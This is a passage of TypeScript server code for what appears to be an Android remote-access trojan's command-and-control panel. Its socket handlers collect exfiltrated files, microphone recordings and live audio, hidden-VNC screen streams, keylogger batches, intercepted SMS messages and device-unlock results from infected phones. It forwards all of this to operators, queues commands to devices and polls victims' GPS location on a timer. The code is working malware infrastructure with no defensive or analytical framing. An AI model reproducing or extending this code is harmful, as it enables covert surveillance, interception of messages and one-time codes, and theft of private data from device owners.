          broadcastData('files');
        } else if (data.type === 'download_start') {
          if (!this.validateTransferStart(data.totalChunks, data.totalSize)) { log.warn(`Socket: File transfer too large: ${id}`); return; }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name, path: data.path,
            channel: CMD.FILES, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (!this.validateTransferChunk(data.chunkData)) { log.warn(`Socket: File chunk too large: ${id}`); this.transfers.delete(transferId); return; }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'download', 'FILES');
              this.markCommandResponded(id, CMD.FILES, `Downloaded: ${transfer.name}`);
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'FILES', `File transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.FILES, `Transfer failed: ${data.error}`);
          }
        } else if (data.type === 'error') {
          const transferId = data.transferId ? `${id}:${data.transferId}` : null;
          if (transferId) this.transfers.delete(transferId);
          const errorMsg = data.error || 'Unknown file transfer error';
          dbHelpers.addLog('ERROR', 'FILES', `File transfer error from ${id}: ${errorMsg}`, JSON.stringify({ path: data.path || '' }));
          dbHelpers.setClientData(id, 'file_error', JSON.stringify({ error: errorMsg, path: data.path || '', timestamp: Date.now() }));
          this.markCommandResponded(id, CMD.FILES, errorMsg);
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'files' });
        } else if (data.type === 'modify_result') {
          const success = data.success !== false;
          const summary = success
            ? `${data.action || 'modify'}: ${data.path || ''}`
            : `${data.action || 'modify'} failed: ${data.error || 'unknown'}`;
          this.markCommandResponded(id, CMD.FILES, summary);
          if (!success) {
            dbHelpers.addLog('ERROR', 'FILES', `File modify failed from ${id}: ${data.error}`, JSON.stringify({ action: data.action, path: data.path }));
          } else {
            broadcastData('files');
          }
        } else if (data.type === 'push_result') {
          const success = data.success !== false;
          const summary = success ? `Pushed: ${data.path || ''}` : `Push failed: ${data.error || 'unknown'}`;
          this.markCommandResponded(id, CMD.FILES, summary);
          if (success) {
            broadcastData('files');
          } else {
            dbHelpers.addLog('ERROR', 'FILES', `File push failed from ${id}: ${data.error}`, JSON.stringify({ path: data.path }));
          }
        } else if (data.type === 'upload_start' || data.type === 'upload_progress') {
          this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: data.name, totalSize: data.totalSize, progress: data.progress || 0 });
        } else if (data.type === 'upload_end') {
          this.markCommandResponded(id, CMD.FILES, `Uploaded: ${data.name || 'file'}`);
        }
      } catch (err: unknown) { log.error(`Files: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.MIC, (data: any) => {
      try {
        if (data.type === 'download_start') {
          if (!this.validateTransferStart(data.totalChunks, data.totalSize)) { log.warn(`Socket: Mic transfer too large: ${id}`); return; }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `recording_${Date.now()}.mp4`,
            channel: CMD.MIC, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (!this.validateTransferChunk(data.chunkData)) { log.warn(`Socket: Mic chunk too large: ${id}`); this.transfers.delete(transferId); return; }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.broadcastToDeviceOwner(id, 'client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'recording', 'MIC');
              this.markCommandResponded(id, CMD.MIC, 'Recording complete');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
          if (data.error) {
            dbHelpers.addLog('ERROR', 'MIC', `Mic transfer failed from ${id}: ${data.error}`);
            this.markCommandResponded(id, CMD.MIC, `Transfer failed: ${data.error}`);
          }
        } else if (data.file) {
          if (typeof data.buffer !== 'string' || data.buffer.length === 0) return;
          if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) { log.warn(`Socket: Mic buffer too large: ${id}`); return; }
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'recording', buffer, data.name || `recording_${Date.now()}.mp4`);
          dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name }));
          this.markCommandResponded(id, CMD.MIC, 'Recording received');
          broadcastData('mic');
        } else if (data.streamAudio === true) {
          if (data.status === 'streaming' || data.status === 'stopped') {
            this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'mic_status', streamStatus: data.status });
            if (data.status === 'streaming') {
              this.markCommandResponded(id, CMD.MIC, 'Stream started');
            } else {
              this.markCommandResponded(id, CMD.MIC, 'Stream stopped');
            }
          } else if (typeof data.buffer === 'string') {
            if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) return;
            this.broadcastToDeviceOwnerBinary(id, 'client:mic_stream', { id, timestamp: data.timestamp }, Buffer.from(data.buffer, 'base64'));
          }
        } else if (data.status) {
          dbHelpers.addLog('DATA', 'MIC', `Mic status from ${id}: ${data.status}`, JSON.stringify({ duration: data.duration }));
          this.markCommandResponded(id, CMD.MIC, data.status);
          const statusData = data.status === 'stopped' || data.status === 'error'
            ? null
            : { status: data.status, duration: data.duration, timestamp: Date.now() };
          dbHelpers.setClientData(id, 'mic_status', JSON.stringify(statusData));
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'mic_status', status: data.status, duration: data.duration });
        } else if (data.error) {
          dbHelpers.addLog('ERROR', 'MIC', `Mic error from ${id}: ${data.message || data.error}`);
          this.markCommandResponded(id, CMD.MIC, data.message || data.error);
          dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null));
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'mic_status', status: 'error', error: data.message || data.error });
        }
      } catch (err: unknown) { log.error(`Mic: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.HVNC, (data: any, binary?: Buffer) => {
      try {
        if (!data || !data.type) return;
        if (binary && typeof binary === 'string') {
          log.warn(`HVNC non-binary: ${id}: string`);
          return;
        }
        if (binary && binary.length > MAX_HVNC_BINARY_SIZE) {
          log.warn(`HVNC too large: ${id}: ${binary.length} bytes, max ${MAX_HVNC_BINARY_SIZE}) - dropping`);
          return;
        }
        if (data.type === 'chunk') {
          const declaredTotal = Number(data.totalSize) || 0;
          const declaredChunks = Number(data.totalChunks) || 0;
          if (declaredTotal > MAX_HVNC_TOTAL_SIZE || declaredChunks > MAX_HVNC_CHUNKS_PER_FRAME) {
            log.warn(`HVNC chunked too large: ${id}: total=${declaredTotal} chunks=${declaredChunks} - dropping`);
            return;
          }
        }
        if (data.type !== 'status' && data.type !== 'input_ack') {
          const now = Date.now();
          const r = this.hvncRate.get(id) ?? { count: 0, windowStart: now };
          if (now - r.windowStart > 1000) { r.count = 0; r.windowStart = now; }
          if (++r.count > HVNC_RATE_LIMIT_PER_SEC) {
            this.hvncRate.set(id, r);
            return;
          }
          this.hvncRate.set(id, r);
        }
        switch (data.type) {
          case 'config':
            if (!binary || binary.length === 0) {
              log.warn(`HVNC no config: ${id}`);
              this.broadcastToDeviceOwner(id, 'client:hvnc', { id, type: 'status', status: 'error: no codec config received' });
              return;
            }
            this.broadcastToDeviceOwnerBinary(id, 'client:hvnc', { id, type: 'config', width: data.width, height: data.height, fps: data.fps, timestamp: data.timestamp }, binary);
            break;
          case 'frame':
            this.broadcastToDeviceOwnerBinary(id, 'client:hvnc', { id, type: 'frame', timestamp: data.timestamp, pts: data.pts, keyframe: data.keyframe === true, width: data.width, height: data.height, size: data.size }, binary);
            break;
          case 'chunk':
            this.broadcastToDeviceOwnerBinary(id, 'client:hvnc', { id, type: 'chunk', transferId: data.transferId, chunkIndex: data.chunkIndex, totalChunks: data.totalChunks, totalSize: data.totalSize, pts: data.pts, keyframe: data.keyframe === true, timestamp: data.timestamp }, binary);
            break;
          case 'status':
            this.broadcastToDeviceOwner(id, 'client:hvnc', { id, type: 'status', status: data.status, streaming: data.streaming, width: data.width, height: data.height, accessibilityEnabled: data.accessibilityEnabled, accessibilityConnected: data.accessibilityConnected, projectionReady: data.projectionReady, codec: data.codec });
            if (data.status && data.status !== 'streaming') {
              dbHelpers.addLog('DATA', 'HVNC', `HVNC status from ${id}: ${data.status}`);
              this.markCommandResponded(id, CMD.HVNC, data.status);
            }
            break;
          case 'input_ack':
            this.broadcastToDeviceOwner(id, 'client:hvnc', { id, type: 'input_ack', completed: data.completed === true, timestamp: data.timestamp });
            break;
        }
      } catch (err: unknown) { log.error(`HVNC: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.INSPECTOR, (data: any) => {
      try {
        if (!data || !data.type) return;
        this.broadcastToDeviceOwner(id, 'client:inspector', { id, ...data });
        if (data.type === 'announcement') {
          dbHelpers.addLog('DATA', 'INSPECTOR', `Announcement from ${id}: ${data.announcement}`);
        } else if (data.type === 'error' || data.type === 'action_error' || data.type === 'screenshot_error') {
          dbHelpers.addLog('ERROR', 'INSPECTOR', `Inspector error from ${id}: ${data.error || data.type}`);
          this.markCommandResponded(id, CMD.INSPECTOR, data.error || data.type);
        } else if (data.type === 'tree' || data.type === 'screenshot' || data.type === 'action_result' || data.type === 'status') {
          this.markCommandResponded(id, CMD.INSPECTOR, data.type);
        }
      } catch (err: unknown) { log.error(`Inspector: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.KEYLOGGER, (data: any, ack?: (r: any) => void) => {
      try {
        if (!data) return;
        this.broadcastToDeviceOwner(id, 'client:keylogger', { id, ...data });
        if (data.type === 'batch') {
          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger batch from ${id} (${data.keystrokes?.length || 0} entries)`);
        } else if (data.type === 'error') {
          this.markCommandResponded(id, CMD.KEYLOGGER, data.error || 'error');
        } else {
          this.markCommandResponded(id, CMD.KEYLOGGER, data.type);
        }
      } catch (err: unknown) { log.error(`Keylogger: ${err instanceof Error ? err.message : String(err)}`); }
      finally { if (ack) ack({ ok: true }); }
    });
    socket.on(CMD.SMS_PUSH, (data: any) => {
      try {
        if (!data) return;
        this.broadcastToDeviceOwner(id, 'client:sms_push', { id, ...data });
        const sender = String(data.sender || data.address || 'unknown');
        const body = String(data.smsBody || data.body || data.message || '');
        const rawTs = data.timestamp || data.date || Date.now();
        const dateStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
        const incomingEntry = { address: sender, body, date: dateStr, type: 1 };
        try {
          const smsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'sms'));
          if (Array.isArray(smsData)) {
            smsData.unshift(incomingEntry);
            if (smsData.length > 500) smsData.splice(500);
            dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData));
          }
        } catch (persistErr: unknown) {
          log.error(`SMS persist failed: ${id}: ${persistErr instanceof Error ? persistErr.message : String(persistErr)}`);
        }
        dbHelpers.addLog('DATA', 'SMS_PUSH', `Incoming SMS from ${sender}`, JSON.stringify({ body: body.slice(0, 80) }));
        this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'sms' });
      } catch (err: unknown) { log.error(`SMS push: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on(CMD.DEVICE_UNLOCK, (data: any) => {
      try {
        if (!data) return;
        this.broadcastToDeviceOwner(id, 'client:device_unlock', { id, ...data });
        this.markCommandResponded(id, CMD.DEVICE_UNLOCK, data.type || 'unlock_attempted');
      } catch (err: unknown) { log.error(`Unlock: ${err instanceof Error ? err.message : String(err)}`); }
    });
    socket.on('cmd_error', (data: any) => {
      try {
        if (!data) return;
        const errorMsg = String(data.error || data.message || 'Unknown device error');
        const cmdId = data.cmdId ? String(data.cmdId) : null;
        log.warn(`Cmd error: ${id}: ${errorMsg}`);
        dbHelpers.addLog('ERROR', 'COMMAND', `Cmd error: ${id}: ${errorMsg}`, JSON.stringify({ cmdId }));
        if (cmdId) {
          this.broadcastToDeviceOwner(id, 'client:command', { id, commandId: cmdId, status: 'error', dataType: 'unknown', error: errorMsg });
          try { dbHelpers.updateCommandStatus(cmdId, 'failed'); } catch { }
        } else {
          this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'error', error: errorMsg });
        }
      } catch (err: unknown) { log.error(`CmdError: ${err instanceof Error ? err.message : String(err)}`); }
    });
  }

  send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): { sent: boolean; commandId: string } {
    const commandId = crypto.randomUUID();
    const socket = this.sockets.get(clientId);
    const paramsForDb = JSON.stringify(params);
    const truncatedParams = paramsForDb.length > 1000 ? paramsForDb.substring(0, 1000) + '...' : paramsForDb;
    dbHelpers.createCommand(commandId, clientId, cmd, truncatedParams);
    if (socket) {
      const { type: _t, cmdId: _c, timestamp: _ts, ...safeParams } = params;
      socket.emit('order', { ...safeParams, type: cmd, cmdId: commandId, timestamp: Date.now() });
      dbHelpers.updateCommandStatus(commandId, 'delivered');
      this.broadcastToDeviceOwner(clientId, 'client:command', { id: clientId, commandId, status: 'delivered', dataType: CMD_TO_DATA_TYPE[cmd] });
      const logParams = { commandId, ...safeParams };

      const logStr = JSON.stringify(logParams);
      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, logStr.length > 1000 ? logStr.substring(0, 1000) + '...' : logStr);
      return { sent: true, commandId };
    } else {
      this.queueCommand(clientId, cmd, params, commandId);
      const { type: _t2, cmdId: _c2, timestamp: _ts2, ...safeParams2 } = params;
      const queueLogStr = JSON.stringify({ commandId, ...safeParams2 });
      dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, queueLogStr.length > 1000 ? queueLogStr.substring(0, 1000) + '...' : queueLogStr);
      return { sent: false, commandId };
    }
  }

  private queueCommand(clientId: string, cmd: CmdType, params: Record<string, unknown>, commandId?: string): void {
    let queue: any[] = [];
    try { queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue')) || []; } catch { queue = []; }
    const { type: _t, cmdId: _c, timestamp: _ts, ...safeParams } = params;
    queue.push({ ...safeParams, type: cmd, cmdId: commandId || crypto.randomUUID(), timestamp: Date.now() });
    dbHelpers.setClientData(clientId, 'queue', JSON.stringify(queue));
  }

  private runQueuedCommands(clientId: string): void {
    let queue: any[] = [];
    try { queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue')) || []; } catch { queue = []; }
    if (queue.length === 0) return;
    const socket = this.sockets.get(clientId);
    if (!socket) return;
    let delivered = 0;
    const remaining = [...queue];
    while (remaining.length > 0) {
      if (!socket.connected) break;
      const cmd = remaining.shift()!;
      const { cmdId, type, timestamp, ...params } = cmd;
      socket.emit('order', { type, ...params, cmdId, timestamp });
      if (cmdId) {
        dbHelpers.updateCommandStatus(cmdId, 'delivered');
        const cmdType = type as CmdType;
        this.broadcastToDeviceOwner(clientId, 'client:command', {
          id: clientId,
          commandId: cmdId,
          status: 'delivered',
          dataType: CMD_TO_DATA_TYPE[cmdType] || 'unknown',
        });
      }
      delivered++;
      dbHelpers.setClientData(clientId, 'queue', JSON.stringify(remaining));
    }
    if (delivered > 0) {
      dbHelpers.addLog('COMMAND', 'QUEUE', `Ran ${delivered} queued commands for ${clientId}` +
        (remaining.length > 0 ? ` (${remaining.length} remaining - socket disconnected)` : ''));
    }
  }

  setGps(clientId: string, interval: number): void {
    const d = getDb();
    const existing = d.select({ id: clients.id }).from(clients).where(eq(clients.id, clientId)).get();
    if (!existing) {
      log.warn(`setGps: client ${clientId} not found`);
      return;
    }
    const oldTimer = this.gpsTimers.get(clientId);
    if (oldTimer) { clearInterval(oldTimer); this.gpsTimers.delete(clientId); }
    d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId)).run();
    if (interval > 0) {
      if (this.sockets.has(clientId)) {
        this.send(clientId, CMD.LOCATION);
      }
      const timer = setInterval(() => {
        if (this.sockets.has(clientId)) {
          this.send(clientId, CMD.LOCATION);
        }
      }, interval * 1000);
      this.gpsTimers.set(clientId, timer);
    }
  }

  private restoreGpsPolling(clientId: string): void {
    const d = getDb();
    const client = d.select({ gpsInterval: clients.gpsInterval }).from(clients).where(eq(clients.id, clientId)).get();
    if (client && client.gpsInterval != null && client.gpsInterval > 0) this.setGps(clientId, client.gpsInterval);
  }
  getOnlineCount(): number { return this.sockets.size; }
  isClientConnected(clientId: string): boolean { return this.sockets.has(clientId); }
  getIO(): SocketIOServer { return this.io; }
  broadcast(event: string, data: any): void { this.io.to('admin').emit(event, data); }
  sendToUser(userId: string, event: string, data: any): void { this.io.to(`user:${userId}`).emit(event, data); }
  invalidateDeviceOwner(deviceId: string): void {
    this.deviceOwners.delete(deviceId);
    this.hvncRate.delete(deviceId);
  }

  broadcastToDeviceOwner(deviceId: string, event: string, data: any): void {
    const ownerId = this.deviceOwners.get(deviceId) ?? dbHelpers.getDeviceOwnerId(deviceId);
    if (ownerId && !this.deviceOwners.has(deviceId)) this.deviceOwners.set(deviceId, ownerId);
    if (ownerId) {
      this.io.to('admin').to(`user:${ownerId}`).emit(event, data);
    } else {
      this.io.to('admin').emit(event, data);
    }
  }

  broadcastToDeviceOwnerBinary(deviceId: string, event: string, meta: any, binary?: Buffer): void {
    if (!binary) return;
    const ownerId = this.deviceOwners.get(deviceId) ?? dbHelpers.getDeviceOwnerId(deviceId);
    if (ownerId && !this.deviceOwners.has(deviceId)) this.deviceOwners.set(deviceId, ownerId);
    if (ownerId) {
      this.io.to('admin').to(`user:${ownerId}`).emit(event, meta, binary);
    } else {
      this.io.to('admin').emit(event, meta, binary);
    }
  }

  cleanupStaleTransfers(): void {
    const now = Date.now();
    for (const [transferId, transfer] of this.transfers) {
      if (now - transfer.receivedAt > 10 * 60 * 1000) this.transfers.delete(transferId);
    }
  }

  cleanupStaleClients(): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
    const result = d.delete(clients).where(and(eq(clients.online, false), lt(clients.lastSeen, cutoff))).run();
    return result.changes;
  }

  disconnectClient(clientId: string): void {
    const socket = this.sockets.get(clientId);
    if (socket) {
      socket.removeAllListeners('disconnect');
      socket.disconnect(true);
    }
    this.sockets.delete(clientId);
    this.deviceOwners.delete(clientId);
    this.hvncRate.delete(clientId);
    const d = getDb();
    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, clientId)).run();
    const timer = this.gpsTimers.get(clientId);
    if (timer) { clearInterval(timer); this.gpsTimers.delete(clientId); }
    for (const [transferId, transfer] of this.transfers) {
      if (transferId.startsWith(clientId + ':')) this.transfers.delete(transferId);
    }
    this.io.to('admin').emit('client:disconnect', { id: clientId });
    const forceOwnerId = dbHelpers.getDeviceOwnerId(clientId);
    if (forceOwnerId) this.io.to(`user:${forceOwnerId}`).emit('client:disconnect', { id: clientId });
  }

  shutdown(): void {
    for (const [, timer] of this.gpsTimers) clearInterval(timer);
    this.gpsTimers.clear();
    this.transfers.clear();
    this.deviceOwners.clear();
    this.hvncRate.clear();
    this.io.close();
  }
}

export const socketService = new SocketService();
